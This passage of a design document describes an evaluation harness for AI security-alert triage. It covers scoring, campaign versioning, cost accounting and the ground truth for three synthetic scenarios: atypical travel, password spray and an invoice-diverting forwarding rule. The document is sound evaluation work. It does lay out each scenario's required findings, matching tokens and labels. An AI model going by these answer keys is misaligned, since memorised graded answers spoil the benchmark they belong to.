  three cells the quota emptied say so.

### Tool outcomes are reported

A score used to carry one error kind, the run's own, and the cell aggregated that same
field, so a tool call that failed never reached either. A run that failed five calls
with `no_fixture` and still produced a result was counted as completed, with a low
evidence recall and nothing to say where the low number came from. The trace showed the
gap, as the tool layer promises; the report did not read the trace for it.

Every run score carries `calls`, counted from the trace whatever the run's outcome:
the total, how many ended `ok`, `error` and `denied`, the error kinds and the denial
kinds each by count, and `no_fixture` on its own line. Every cell pools those counts,
reports `no_fixture` as a proportion of all calls with its interval, and counts the
runs in which at least one occurred. The kind is read from the record's failure view:
every failed record's redacted response is a structured failure whose `error` field
names the kind, `no_fixture`, `invalid_arguments`, `upstream_error`, `not_found`,
`malformed_response`, `unknown_tool`, or the denial, `scope_denied` or `order_denied`,
and the trace contract exposes it as `failure_kind`. Denials are counted apart from
errors because under `tier1` a denial is the scope working, not a gap.

**A `no_fixture` count is reported beside the recall, never turned into a threshold.**
A `no_fixture` call has two causes the summary cannot tell apart: a model that asked
badly, and a fixture that does not cover what a reasonable model asks. Only the
arguments in the trace say which, and a person reads them. A threshold above which the
recall is declared uninterpretable would decide that question with a number the harness
cannot justify, and below it would license reading the recall as if the gaps were not
there. So the rule is the one scenario 1's recording already follows: the evidence
recall of a cell with fixture gaps is a floor on what the model does with the evidence
it was actually handed, and the printed report marks the recall line with the count
whenever the cell has one, so the number cannot be read without it. Attribution is a
decision, recorded as a fixture change with its test when the fixture was at fault,
and left as the model's miss otherwise; the results directory keeps every artifact so
it can be made after the fact.

### One real run before a cell is paid for

No test finds the gap a model's question opens. The scripted suite hits a stub on every
call of every scenario, and it proved nothing about scenario 5, because the script asks
the questions the alert's evidence spells and a model asks the questions an analyst asks.
The collision probe checks the recordings that exist. Both are floors, and neither holds
the question that has not been asked yet. So a scenario is not measured until a real
model has asked it questions once and the author has read them. Decided, in order:

1. The scripted suite over the scenario is green: every call hits a stub, and the
   projection test holds every listed tool's reading to the findings' words.
2. One real run, on the cheapest model available, with `--runs 1`, into a directory of
   its own and not the campaign's, see "A campaign is one fixture revision". It costs
   one investigation, and the campaign showed what skipping it costs: three runs each
   on two scenarios before anyone read a trace.
3. Every `no_fixture` call in its trace is read with its arguments and decided, one by
   one: a question the fixture should answer, closed by a stub keyed on the entity the
   question named, with the request replayed from the artifact in a test so the check
   cannot drift from the run; or a question the fixture should not answer, named in the
   scenario's section as what no stub carries on purpose. Neither is left as a count.
4. The recording is committed under `runs/`, so the probe holds its questions and the
   next scenario's stubs are checked against them.
5. Then the cell, and the recall it produces is read as a floor, as before.

What this cost on the first campaign, stated: scenarios 2 and 5 were run at three runs
each before step 3, and the evidence recall of `lsass_access` is a floor under seven
refused calls that step 3 has since closed. The cells stand as they are; the closed
gaps are on record in the scenarios' sections beside them, and a rerun measures the
model in a new campaign, under the rule decided next, so that it does not pool with
these.

### A campaign is one fixture revision

A cell accumulates, and the first campaign showed what that pools. Its results
directory holds 37 runs made between 10:16 and 11:41 UTC on 2026-09-15 under the
fixtures before commit 6e4ff06, which then closed scenario 5's runbook refusals and
scenario 2's address refusals, and two gate runs made at 12:25 and 12:26 UTC under the
fixtures after it. The harness continues the numbering of whatever a cell holds, so a
rerun into that directory would have put post-fix runs beside pre-fix ones in the same
cell, and the cell's recall would be one number over two harnesses: the floor scenario
5's section describes, and whatever the closed gaps now allow. The `no_fixture` count
marks the recall line, as decided under "Tool outcomes are reported", and it does not
say which runs were handed which stubs. And the two gate runs are not cell runs, by
the rule above, yet they sit in their cells' directories at index 0, so those two cells
could never be read clean. Decided:

- **The fixture set a run was handed is on record, as a digest.** `fixture_digest` is
  the SHA-256 over the fixture directory as the loader reads it: every `*.json` file at
  its top level, the manifest included, in sorted name order, each contributed as its
  name and its bytes with their lengths in front, so that no two directories collide by
  concatenation. It is the fixture revision and nothing else: a stub added, widened or
  narrowed changes it; a change to the prompts, the code or a truth file does not. A
  truth change re-scores without a rerun, as decided under "Scorers"; a prompt or code
  change is a different question, versioned by the commit, and a digest that tried to
  cover it would be a second git. The digest sits on every run's `eval.json`, beside the
  wall clock, since it is what only the harness knew.
- **A results directory is one campaign, and a campaign is one fixture revision.** The
  first `eval` into a directory writes `campaign.json` at its root: the digest, the
  fixture directory as given, and the time. Every later `eval` into it compares the
  current digest with the recorded one before any run and refuses a mismatch, naming
  both digests and asking for another `--results` directory, with exit code 2 and no
  run made. Within one revision a cell still accumulates: a second invocation continues
  the numbering, and nothing measured is lost. Across revisions nothing pools: the old
  campaign stays whole under its digest and the new one starts empty under its own.
  The guarantee is the harness's, not a convention's: the check runs on every
  invocation, before the first run directory is made.
- **A directory of runs that carries no `campaign.json` is refused for new runs.** Such
  a directory is a campaign from before this rule; its runs carry no digest, so the
  harness cannot say what they were handed and cannot say whether the current fixtures
  are the same. `results/` as it stands on 2026-09-15 is that directory, and it is the
  case this rule was written on: it is the first campaign, closed, and the next `eval`
  refuses it rather than adding a neighbour to its pre-fix runs. It can still be
  re-scored: `eval-report` reads runs without a digest as they are and says, above the
  cells, that the campaign is from before fixtures were versioned and the fixtures its
  runs were handed are not on record. Its cell numbers are read as scenario 5's section
  already reads them, as a floor under gaps since closed, and its two gate runs are
  read by index and time in scenarios 7 and 8's sections. Nothing in it is moved or
  deleted: the results directory is not committed, and every artifact stays on disk
  whatever its kind.
- **`eval-report` refuses a directory whose runs disagree.** The summary reads whatever
  run directories are there, so a directory assembled by hand from two campaigns would
  pool them at report time. The report reads every run's digest and the `campaign.json`
  if present, and refuses when together they name more than one revision, listing
  them. A run without a digest is not held against the others, since it cannot be; a
  directory holding any such run is reported as from before the rule, and the header
  says so. The summary carries the digest when every run does, and the printed report
  opens with it, so a number cannot be read without the fixtures it was measured under.
- **Where the gate run goes.** The gate run of step 2 above is one run whose purpose is
  to be read, and step 3 may change the stubs after it. It is made with `--results`
  naming a directory that is not the campaign's, `gates/` in this repository. When
  step 3 closes a gap the digest changes, and the harness refuses the cell into the
  gate's directory and the gate run into the cell's whichever way the operator points,
  so the separation holds by structure. When the gate closes nothing, as scenario 8's
  did, the fixtures are the same and only the directory keeps them apart; that is a
  convention, and it is said so, because the harness cannot tell a gate run from a cell
  run by looking at it and a flag that said "this is a gate" would be the operator's
  word in a file. The demonstration-run rule under "Using it" reads across both
  directories in the order the runs were made, which is why it no longer says "index
  order".
- **What it costs, stated.** `--results` gains a rule: a directory is a campaign and a
  campaign is one fixture revision, so a fixture fix means a new directory. The name is
  the operator's choice; the harness records what matters, the digest, and refuses the
  mismatch. The default `--results results/` is unchanged, and on this repository it is
  refused until the operator names another, which is the point: the choice to start a
  new campaign is made once, in the open, rather than never.
- **The second campaign exists, under this rule.** `campaigns/02`, ignored by git as
  `results/` is, run on 2026-09-15 from 13:52 UTC by `google_genai:gemini-3.5-flash-lite`
  under `analyst`, three runs per cell, on fixture digest
  `a1861664bc5a11db2c484b92c836c382de183157f8793b27ba8e8ad41788c84e`, the fixtures of
  commit 34bc77c, unchanged from the campaign's first command to its last. It was made
  in three passes: one over every scenario at `--runs 3`, then two catch-up passes with
  `--scenario` on the cells short of three served runs, each invocation asking for that
  cell's shortfall and no more, the invocations of a pass spaced a minute apart because
  the free tier's quota is fifteen requests a minute and a back-to-back pass spends it
  on its second run, and the passes at least ten minutes apart. `--timeout`,
  `--max-retries` and `--max-corrections` stayed at their defaults. Its numbers are the
  README's, not this document's.
- **How a miss on a required finding is attributed, decided on the second campaign.**
  The score names each miss by finding and by the tokens the statement lacked, and it
  does not say why they were absent; that is read from the artifact by a person, the
  way a `no_fixture` is under "Tool outcomes are reported". Every (finding, served run)
  miss is attributed to exactly one of two causes. `MODEL`: no observed fact in the run
  establishes the finding, because the fact was never written or the reading that
  carries it was never fetched. `TOKENS`: a grounded observed fact establishes the
  finding, cites a tool the finding lists, and its statement fails on the whole-word
  tokens alone. The tool is read before the wording, in the matcher's own order, and a
  fact that holds the tokens on a citation to a tool the finding does not list is
  `MODEL`. That case is the runbook shortcut: a runbook sentence describing what an
  agent does in general is not a reading that it did it here, and a finding listed on
  the telemetry is not carried by the runbook's restatement of it, whatever words it
  uses. Applied on 2026-09-15 to the campaign above, whose 24 served runs reached 38 of
  96 (finding, run) pairs: of the 32 required findings, 16 were reached in no served
  run, 8 in every one and 8 in some. The 16 make 48 misses, and all 48 are `MODEL`,
  none `TOKENS`: in 42 the reading that carries the finding was never fetched, the tool
  never called or the query never reaching the rows, and in 6 the runbook was called,
  its entry carried the finding in the finding's own words, and the model filed it under
  `assumptions` or in `recommended_action` rather than as an observed fact, on
  scenario 4's change window and scenario 8's HR routing in every served run. The one
  wording that read like a token miss, "a suspicious inbox manipulation rule" on
  scenario 2, cites `get_related_alerts`, which the finding does not list, and is
  `MODEL` on the tool before its wording is read. So no token widening is proposed and
  no truth file is changed: a widening written after the runs were read would be fitted
  to them, which is what the whole-word rule exists to refuse, and any later widening
  is a diff a person applies and a later session re-scores. What the attribution shows
  beside the count: in three cells, scenarios 4, 5 and 6, every served run reached the
  right verdict on one runbook call and no telemetry call, so the verdict accuracy of
  those cells is the runbook's and their recall says so; in the other five cells the
  reading does not hold, since the telemetry was cited or, on scenario 7, nothing was.
  The table itself belongs in the README.

### Statistics

N runs per cell, configurable with `--runs`, default 3: small, because the build runs on
the scripted client and a real cell costs money, and the intervals say what three runs
are worth. A cell is one model under one role on one scenario.

Every proportion is reported as a `Proportion`: numerator, denominator, point estimate,
and the Wilson 95 percent interval. The interval is computed in code, with the formula
in the docstring, and never approximated with a normal interval: at n of 3 the normal
interval is meaningless and the Wilson interval is not. A proportion with an empty
denominator has no estimate and no interval, and is reported as absent. The interval
appears everywhere the point estimate does, in the summary file and in the printed
report, so a number cannot be read without its width.

### Cost and latency

Both per investigation, and neither on the contracts.

- **Cost** is derived at report time from the trace's `ModelUsageRecord` entries and a
  price table that lives in the evaluation package, keyed by the `provider:model` string,
  with the rate per million tokens for input, output, cache reads and cache writes, and
  the source and date of each row. The artifact carries tokens, never money, so a price
  change never rewrites an artifact. A model absent from the table has no cost, and the
  report says "no price for", never zero. The scripted client is in the table at zero,
  explicitly.
- **The one model run for real is priced from its provider's page, not from memory.**
  `google_genai:gemini-3.5-flash-lite` is in the table from the Gemini API pricing page,
  `https://ai.google.dev/gemini-api/docs/pricing`, read on 2026-09-15 with the page
  dated 2026-09-11: paid tier, 0.30 input, 2.50 output including thinking tokens, 0.03
  per cached token read, all per million. Cache writes are billed as ordinary input on
  that API, so the row prices them at the input rate; the storage charge, 1.00 per
  million tokens per hour, is not per token and is not carried, and the row says so.
  The campaign ran on the free tier, which bills nothing. The cost it reports is what
  the same tokens would cost on a billed account, which is the number a comparison
  matrix needs; the free tier is a property of the account, not of the model.
- **The two other providers are priced from their pages, on 2026-09-15, before any
  matrix is paid for.** "Cost discipline" says one cell is measured on real usage and
  the full cost extrapolated before the comparison matrix, and the price table is where
  the extrapolation gets its rates. Three Anthropic rows sat in the table priced "as
  cached in the claude-api reference on 2026-06-24", which is a price from memory under
  another name: a cached table is not the provider's page, and a row that names no URL
  cannot be checked. They are replaced. Decided:
  - The chosen tier per provider is the cheapest on the provider's pricing page that
    supports tool calling and structured output, and the next tier up is priced beside
    it so the matrix can be costed at both. OpenAI: `gpt-5-nano`, then `gpt-5-mini`;
    each model's page lists `function_calling` and `structured_outputs`. Anthropic:
    Claude Haiku 4.5, then Claude Sonnet 5; the structured-outputs page lists both, and
    the models page says every current model supports tool use.
  - OpenAI rows, from `https://developers.openai.com/api/docs/pricing`, standard tier,
    read 2026-09-15; the page carries no date. `gpt-5-nano`: 0.05 input, 0.005 cached
    input, 0.40 output. `gpt-5-mini`: 0.25, 0.025, 2.00. The cache-write column reads a
    dash for both: the prompt-caching guide bills cache writes only from GPT-5.6 on and
    says "no additional cache-write charge" for earlier models, so the rows price cache
    writes at zero and the source says why. Caching is automatic on that API; the client
    reports cached tokens as `cache_read`, and `cache_creation` only when a response
    carries `cache_write_tokens`, which these models' responses do not. Output includes
    reasoning tokens, as on Gemini. The flex and batch tiers are cheaper and are not the
    tier the harness calls.
  - Anthropic rows, from `https://platform.claude.com/docs/en/about-claude/pricing`,
    read 2026-09-15; the page carries no date. Haiku 4.5: 1 input, 1.25 five-minute
    cache write, 2 one-hour cache write, 0.10 cache read, 5 output. Sonnet 5: 2, 2.50,
    4, 0.20, 10. Opus 5 stays in the table, re-sourced from the same page: 5, 6.25, 10,
    0.50, 25. Each row prices cache writes at the five-minute rate, the default TTL,
    and a one-hour write is under-priced by the row, said so in the source. What the
    client does with a write, read in `langchain-anthropic` 1.7.2 and not exercised:
    when a response carries the per-TTL breakdown it zeroes `cache_creation`, files the
    counts under `ephemeral_5m_input_tokens` and `ephemeral_1h_input_tokens`, keys the
    trace's usage record does not read, and adds them to `input_tokens`; so a cache
    write on this provider reaches the cost as fresh input, at the input rate and not
    1.25x. The harness sets no `cache_control`, so no write occurs on its runs; the day
    caching is turned on for this provider, the usage record reads those keys first.
    Not fixed here, since this session prices and probes. The rows
    are keyed on the API alias, `claude-haiku-4-5` and `claude-sonnet-5`, which the
    models page lists beside the pinned ids, since the alias is what a run is started
    with and the key is the string the run was started with.
  - **The Haiku 4.5 alias and its pinned id bind differently**, seen offline with no
    key: `langchain-anthropic` 1.7.2 declares `structured_output` true for
    `claude-haiku-4-5`, through an override in its own profile data, and false for
    `claude-haiku-4-5-20251001`, which has no override, while the provider's
    structured-outputs page lists the pinned id as supported. The same model under two
    strings is recorded with two `output_binding`s, which is what the field exists to
    show. The probe uses the alias, and the artifact says so. The profile is not
    corrected here and the strategy is not chosen from the page: a strategy chosen from
    what the page says rather than what the profile says is the name fallback under
    another name, and the decision under "Model independence" stands.
  - **A price row names a model the page lists, and a person opens the page.** The
    case, on 2026-09-15: the two OpenAI rows, `gpt-5-nano` and `gpt-5-mini`, committed
    in 83f265d with the pricing page as provenance, in the same commit that re-sourced
    three Anthropic rows for citing a cache and added a test named `not_from_memory`,
    were challenged the same day as rows the page does not list, the challenge naming
    the page's lineup as gpt-6-astra, gpt-5.6-sol, gpt-5.6-terra, gpt-5.6-luna,
    gpt-5.6-cyber, chat-latest, gpt-5.3-codex, gpt-rosalind-research and
    o4-mini-2025-04-16. The page, opened in a browser by the session that took the
    challenge, shows exactly that lineup in its default view, and lists both rows'
    models at the rows' numbers under the flagship table's "All models" expander, with
    gpt-5.4-nano, gpt-4.1-nano, gpt-4o-mini and the rest of the earlier catalogue. The
    expanded table has no cache-write column at all, where 83f265d's source spoke of a
    dash. Whether the rows were read from that expanded table or written from memory
    and given the URL afterwards cannot be told from the tree: the numbers match the
    page, and the source named nothing a reader of the default view could find. The
    session that had to decide says so rather than picking the reading that clears
    either side, and the rows stand, since the page lists them at their numbers. The
    rule the case leaves: a price row names a model the page lists; a person opens the
    page and reads the row from it, since the suite opens no socket; a row whose model
    is not in the page's default view says where on the page it sits, and the two
    OpenAI sources now do; and the test on the rows is a shape check on the citation,
    named as one. It holds every priced row to a URL and a read date in its source,
    refuses a source that names a cache in place of a page, and checks that the numbers
    the test carries agree with the numbers the table carries. An invented row with a
    URL attached passes it, which is why its name no longer says "not from memory".
- **Latency** is the wall clock the harness measured around the investigation, recorded
  in the harness's own per-run file. It is not on the artifact, because a `triage` run
  answers the proposal interrupt on a terminal and its wall clock would include the
  analyst's deliberation; the harness answers every proposal instantly, so its clock
  measures the investigation alone. The proposal is accepted in every run: the human
  decision is not what the harness measures, and rejecting it would change what the
  model does next.
- **The population of each is the served runs, and the report line says so.** The first
  campaign's kerberoasting cell read a mean wall clock of 1.55 s, over one 5.60 s
  investigation and three 0.17 s refusals, and 2942 input tokens per run, which was
  11768 divided by four. A refusal before any turn has a wall clock, the time the
  provider took to say no, and it is not the latency of an investigation. So the wall
  clock, the tokens per run and the mean cost are over the served runs, the population
  the accuracy numbers use, and each line names it. A cell with no served run has no
  latency, no tokens per run and no mean cost, and reports them as absent, never as
  zero. What the refused runs spent is not dropped: the cell carries the input and
  output tokens spent on refused runs, the report prints them beside the tokens per
  run whenever there are any, and the cost total is over all runs, refused included,
  because the tokens were billed whether or not the run finished. Mean per served run
  and total over every run: what an investigation costs, and what the campaign cost.
  `ungrounded_claim_rate` was already over the completed runs and stays so.

### The CLI

```
alert-forensics eval --scripted [--runs N] [--results DIR] [--scenario NAME]
alert-forensics eval --model provider:name [--role ROLE] [--runs N] [--results DIR] ...
alert-forensics eval-report DIR
```

- `eval` runs every scenario under `examples/` (`--scenario` narrows it) N times each
  and writes one directory per run: `DIR/<model>/<role>/<scenario>/<k>/` holding
  `run.json`, the same artifact `triage` writes, readable by `show` and `replay`;
  `run.raw/`, its raw store; `eval.json`, what only the harness knew, the scenario, the
  cell, the index, and the measured wall clock; and `score.json`, the `RunScore`. The
  model string is made a directory name by replacing the characters a path cannot carry.
  Every run keeps its artifact, whatever its outcome, so a failed run is inspectable,
  and a second invocation into the same directory continues the numbering rather than
  overwriting: a cell accumulates, and nothing measured is lost to a rerun, within one
  fixture revision. The directory carries `campaign.json`, every `eval.json` carries
  `fixture_digest`, and an invocation under other fixtures, or into a directory of
  runs that carries no `campaign.json`, is refused before any run, see "A campaign is
  one fixture revision".
- After the runs it writes `DIR/summary.json`, one `CellSummary` per cell found under
  the directory, and prints the report. The summary is derived from the run directories
  and can be recomputed at any time; `eval-report DIR` recomputes it, re-scoring every
  run from its artifact and the current ground truth, rewrites `score.json` and
  `summary.json`, and prints the report. Cells from several sessions in one directory
  are summarised together, since the summary reads whatever is there, provided they
  name one fixture revision; a directory whose runs name two is refused.
- **`--scenario` narrows what is run, never what is summarised.** The summary step of
  `eval` loads every scenario under the scenarios directory, exactly as `eval-report`
  does, so a directory holding earlier cells of other scenarios summarises whole. The
  code handed the narrowed list to the summary, which then refused the whole directory
  for holding a run of a scenario it had been given no truth for; the sentence above
  was the spec, the code disagreed with it, and the code was wrong. What is still
  refused: a run whose scenario has no truth under the scenarios directory at all,
  since it cannot be scored, and a summary that skipped it would be a summary of less
  than what is there.
- `--scripted` runs the whole suite with no key and no network, on the built-in script,
  which is how the test suite exercises it. Its verdict is `inconclusive` by
  construction, so its verdict accuracy is zero on every scenario whose label is not
  inconclusive; that is the floor the harness measures, not a defect in it.
- `--model` runs it for real; `--timeout`, `--max-retries`, `--max-corrections` and
  `--role` mean what they mean for `triage`. A provider refusal is a run with error kind
  `rate_limit` or `overloaded`, counted apart from the run's own failures and out of
  every accuracy denominator, see "A provider refusal is the quota's number"; the
  harness goes on to the next run rather than stopping, and the summary shows the kind.

### Scenario 1, the first ground truth

Checked against the table under "Scenarios": the signal is two sign-ins geo-located to
two cities, the assertion is that the person was in two places, and the assertion is
false because both sign-ins egress from the group SASE gateway. Label `false_positive`,
no escalation.

- Required findings, three: the Paris sign-in from `203.0.113.7`, the Amsterdam sign-in
  from `203.0.113.7`, each cited from `search_events`; and that the address is the SASE
  gateway, cited from `search_runbook`. Two findings for the two sign-ins rather than
  one for "both", because a fact that names each sign-in with its address has
  established the shared egress in a form the tokens can see, while "both" has too many
  spellings to enumerate honestly.
- The gateway finding is carried by the runbook alone. Checked against the fixtures
  under whole-word matching: the runbook excerpt reads "The group SASE gateways egress
  from 203.0.113.0/24 (Amsterdam) and 198.51.100.0/24 (Paris)", which carries `SASE`,
  `gateways`, `egress` and the range as whole words. VirusTotal's reading of the address
  carries `EXAMPLE-SASE-NET` as the owner and `203.0.113.0/24` as the network, and no
  field of it holds the word `SASE` or any of `gateway`, `gateways`, `egress`, `proxy`.
  A fact citing `lookup_ioc` that says the address is a gateway says more than its
  source does; that inference belongs in `assumptions`, and a finding must not reward
  it as a fact. `lookup_ioc` was listed until this check and is dropped.
- Its tokens: the address or the runbook's range, `203.0.113.7` or `203.0.113.0/24`,
  since the runbook names the range and a model restating it for the alert's address
  names the address; the word `SASE`; and one of `gateway`, `gateways`, `egress`,
  `proxy`, the runbook's own words and the two a model most plausibly restates them
  with. Its first tokens were `203.0.113` and `SASE`, fitted to the recording: the
  prefix matched inside the address and `SASE` matched inside the owner name, and a
  fact that only copied the ASN owner was credited with saying the address is a
  gateway. That is the case the whole-word rule above was decided on.
- The scenario's stubs answer the requests a model plausibly makes about this
  scenario's entities, and nothing else, under the free-text rule decided under the
  tool layer. The sign-in stub requires both a sign-in table, any of `SigninLogs`,
  `AADSignInEventsBeta` and `IdentityLogonEvents` since the model chooses the table,
  and the account `jdoe`, since the rows are jdoe's; a sign-in query about another
  account is a `no_fixture` error, not jdoe's rows. The runbook stub requires the
  entry's subject: the alert type, `atypical travel` or `impossible travel`, the
  product `SASE`, or one of the two ranges the entry names; a question about another
  scenario's subject, an RMM relay or a Kerberoasting scanner, is a `no_fixture` error,
  not this entry. The cities and the words egress, gateway, proxy and VPN were matched
  for one commit and are not any more: they are where the gateway sits and what a
  gateway is, and every scenario's questions use them. The identity stub matches the
  account name and its UPN, since the alert carries both and the model may ask with
  either. Checked against the committed recording: its sign-in query names
  `jdoe@contoso.com`, its runbook query names `SASE`, its identity request names the
  UPN, and all three still hit; a test replays the three requests from the artifact
  itself so the check cannot drift from the recording.
- Expected missing context, two: the gateway or VPN session log that ties the user to
  the gateway at both times, which no tool provides; and the MFA or device compliance
  outcome, which the runbook checklist asks for and the sign-in view does not carry.
- The committed recording under `runs/atypical_travel/defaults-2026-09-14/` scores
  verdict 1, evidence recall 2 of 3, missing context 0 of 2, escalation correct. The gateway finding is not
  reached, and the trace says why. The model queried the runbook with "VPN SASE
  corporate egress proxy Amsterdam Paris", the right terms for the entry that answers
  it, and the fixture's default answered no hits because the stub matched only the
  phrase "atypical travel". It asked for the identity of `jdoe@contoso.com` and was
  told the identity was not found, for the same reason. With the runbook silent, the
  only citable source left for the gateway was VirusTotal, and the model wrote what
  VirusTotal says: "IP address 203.0.113.7 belongs to the ASN 64496 (EXAMPLE-SASE-NET)
  network range", which names the owner and never says the address is a gateway. It
  did not invent the gateway on that citation, which is the right behaviour. Under the
  substring rule it scored 3 of 3, on `SASE` inside the owner name. So the recall
  number measures a fixture gap the default hid, not the model: on this recording 2 of
  3 is a floor on what the model does with the evidence it was actually handed, and the
  fixture is now corrected as above. The recording is kept as it is, since a recording
  is a real run and this one is the run that found the defect. The missing-context zero
  is the model's: it named nothing it could not establish, and it had been told the
  runbook was empty and the identity unknown without naming either as unobtained.
- Re-recorded under the corrected fixtures on 2026-09-15, in the first campaign: five
  completed runs, every verdict right, four of them at evidence recall 3 of 3, and the
  runbook, the identity and the sign-ins hit on every one. The demonstration run under
  `runs/atypical_travel/campaign-0/`, the first completed by rule, is the one at 1 of 3:
  it wrote one fact for both sign-ins, "two successful sign-ins at 09:12:04 and 09:51:40
  from 203.0.113.7", and named neither city, so the two sign-in findings missed on
  `Paris` and `Amsterdam`. That is the "both" case scenario 1's findings were split
  for, and the miss is the model's: the finding's word is the city, and the fact did
  not say it. Missing context stayed 0 of 2 on every run.

### Scenario 2, password spray

Checked against the table under "Scenarios". The signal is many failed sign-ins across
many accounts from few sources, then one success: what the rule's logic measured, and
true. The assertion is that credentials were guessed at scale and an account was taken
over, at the granularity of T1110.003 and of the account it reached. It is true: the
one success is followed, from the same address, by a new authentication method and a
new inbox rule on the account, neither of which the account's owner made. Intent
decides only between `true_positive` and `benign_true_positive`, and nothing here is
authorised. Label `true_positive`, escalation expected.

The story the fixtures tell, all synthetic, in the documentation range `192.0.2.0/24`
because the other two are scenario 1's: 137 accounts received a single password each
from 31 addresses in 12 countries between 06:02 and 06:42 UTC, through the legacy
ROPC flow whose user agent is `BAV2ROPC`, which is not subject to interactive MFA. One
attempt succeeded, `rbennett@contoso.com` from `192.0.2.44`; an interactive sign-in
from the same address followed, the registration interrupt was answered with a new
Microsoft Authenticator method, and a `New-InboxRule` named "." was created that moves
mail mentioning password, MFA, security or sign-in to RSS Feeds and marks it read.
The account is a Treasury Operations identity of high priority. The techniques the
alert declares are `T1110.003` and `T1078.004`; the follow-on techniques the
investigation is expected to resolve, `T1556.006` and `T1564.008`, are not on the alert
and are added to the packaged excerpt, cut verbatim from the same bundle, so a model
that names them offline resolves them.

- Required findings, four, each cited from the hunting API or the SIEM, since the two
  readings carry the same words; checked by reading the projected views, not the
  fixture files, and held by a test that projects every stub of the scenario and
  requires each listed tool's reading to carry every token as whole words.
  The scale of the spray: `137`, `31` and `12`, which the hunting aggregate carries as
  `dcount_AccountUpn`, `dcount_IPAddress` and `dcount_Country` and the SIEM as `dc(user)`,
  `dc(src)` and `dc(src_country)`. The success: the account, `192.0.2.44`, and one of
  `LogonSuccess`, the hunting reading's word, or `success`, the SIEM's, with
  `successful`, `successfully` and `succeeded` as the restatements a model plausibly
  writes. The new method: the account and one of `security info`, the audit action's
  words, `Authenticator`, the method's, or the restatements `authentication method`
  and `MFA method`. The rule: the account and one of `New-InboxRule`, the action, or
  `inbox rule` and `mailbox rule`. The account token is the pair `rbennett@contoso.com`
  or `rbennett`, since the UPN is one word under the whole-word rule and a model may
  write either. The playbook thresholds are not a required finding: the playbook is
  guidance about what to do, not evidence about what happened, and the four findings
  above are what the verdict rests on.
- The runbook entry for the scenario carries the three thresholds the design names
  under "Where conventional code wins", and the deterministic path that would apply
  them does not exist yet. What the model is handed instead: the three distinct counts,
  read from an aggregate the hunting API or the SIEM returns as one row, so the numbers
  are read and not computed; the comparison against the playbook is the model's. That
  is the gap this scenario exercises, stated here so the number it produces is read as
  one until the path is built.
- Stubs, all labelled `password_spray`, each keyed on the entities of the rows it
  returns: the account's sign-ins, its audit events and its identity on `rbennett`;
  its related alerts on the UPN; the two addresses the account's rows name on
  VirusTotal; the runbook on the alert type, `password spray` or `spraying`, or the
  user agent the entry explains. One stub is keyed on an action rather than an
  account, and said so: the tenant-wide aggregate of failed sign-ins is about 137
  accounts and 31 addresses the model cannot name before it asks, so its match names
  the sign-in table, a failure marker such as `ErrorCode`, `FailureReason` or
  `failure`, and an aggregate such as `summarize`, `dcount` or `stats`. The account
  stubs precede it in file order, so a failure aggregate that names a known account
  gets that account's rows. The residual first recorded here, that a failure aggregate
  naming an account no scenario knows was answered with the tenant aggregate, was
  wider than the note said: a failure aggregate naming no account at all was answered
  too, from any scenario's run. It is closed by the binding decided under the tool
  layer, which offers these two stubs to a run of this alert and to no other; within
  this scenario they still answer any failure aggregate, which is what they are for.
  No stub labelled `test` belonged to this scenario: the three that existed when it
  was written served a production server, a workstation's process tree and a
  redaction case, none of which this scenario names; scenario 4 has since claimed the
  first and rewritten the third.
- **The address pivot, found on the first campaign.** Three completed runs, and every
  one opened with a sign-in query naming both `rbennett` and `192.0.2.44`, which the
  account stub answered. Then two of them asked the runbook for the bare address, and
  one asked the hunting API twice what the address had done, a distinct count of
  accounts by address and a listing of its sign-ins, and all four were refused: the
  stubs keyed on the account, and the address is the other entity these rows hold. So
  the hunting API and the SIEM each gain a stub keyed on the address, answering a
  sign-in query that names it with the address's own rows: the five accounts it tried
  through BAV2ROPC between 06:09 and 06:38, each a single failure, then rbennett's
  success and the interactive sign-in that followed, which the account stub already
  holds. They sit after the account stubs in file order, so a query naming both gets
  the account's rows as before, and before the aggregate. The runbook gains a declared
  empty reading keyed on the address, after the entry stub, so a question naming the
  address and the spray still gets the playbook and the bare address gets no hits. A
  fourth question about the address, a distinct count of the accounts and successes
  from it, was answered on the campaign by the tenant-wide aggregate, which is about 31
  addresses and was the wrong reading for a question about one; the address stub sits
  before the aggregate, so it answers that question too. The four requests are replayed
  from `runs/password_spray/campaign-3/` and `campaign-5/` in a test, so the check
  cannot drift from the runs. The two hunting refusals are
  worth reading: the model had the address from the alert and asked the right
  question, and the harness told it the harness had nothing. Fourteen stubs carry the
  label: one identity, one related alerts, two indicators, four hunting queries, two
  runbook entries of which one is empty, four SIEM searches.
- Expected missing context, two: what was done in the mailbox after the rule, which no
  fixture carries; and whether any of the other sprayed accounts also had a success,
  which the failure aggregate cannot say.
- The scripted cell over this scenario is a plumbing check and its numbers are the
  floor the harness measures: every call the script makes hits a stub, so the tool
  calls block shows no `no_fixture`, and the evidence recall is zero because the script
  states no fact in the findings' words. Six real runs on 2026-09-15, in the first
  campaign and before the address stubs above: three refused by the provider, one of
  them after four tool calls, and three completed with the verdict right at evidence
  recall 1 of 4 each and one or two `no_fixture` calls apiece; two are kept under
  `runs/password_spray/campaign-3/` and `campaign-5/`.

### Scenario 3, forwarding rule

Checked against the table under "Scenarios". The signal is inbox rules created that
forward to one external address, filtering on payment terms: what the rule's logic
measured, and true. The assertion is that mail is being diverted outside the
organisation, at the granularity of T1114.003 and of the mailboxes it names. It is true:
three rules on three Accounts Payable mailboxes, each with `ForwardTo` set to the same
address on a domain registered nine days earlier, each filtered on invoice, IBAN, SWIFT,
payment and remittance. Intent decides only between `true_positive` and
`benign_true_positive`, and the rules were not the users' doing: each was created
minutes after a sign-in from an address none of the three had used, on an unmanaged
device, and nothing about an external remittance mailbox is sanctioned. Label
`true_positive`, escalation expected. The intent is payment fraud, and rules that divert
invoices are its mechanism.

The story the fixtures tell, all synthetic. The three users, `amorel`, `tkowalski` and
`lferreira`, all `@contoso.com`, are Accounts Payable identities of high priority in
London. Between 05:02 and 05:19 UTC on 2026-09-14 each signed in from
`2001:db8:7a3c:1200::1f`, a hosting address in the IPv6 documentation range because the
three IPv4 documentation ranges are scenarios 1 and 2's, through a browser on an
unmanaged, non-compliant device, with MFA reported satisfied and conditional access
reported passed: the shape of a replayed session token, which is what the runbook's
adversary-in-the-middle entry says it is. Between 05:14 and 05:27 a `New-InboxRule`
named `..` was created on each mailbox from the same address: `ForwardTo`
`ap.remittance@contoso-invoices.example`, `SubjectOrBodyContainsWords`
`invoice;IBAN;SWIFT;payment;remittance`, marked read, stop processing. VirusTotal knows
the address as a hosting range with a few detections and the domain as nine days old.
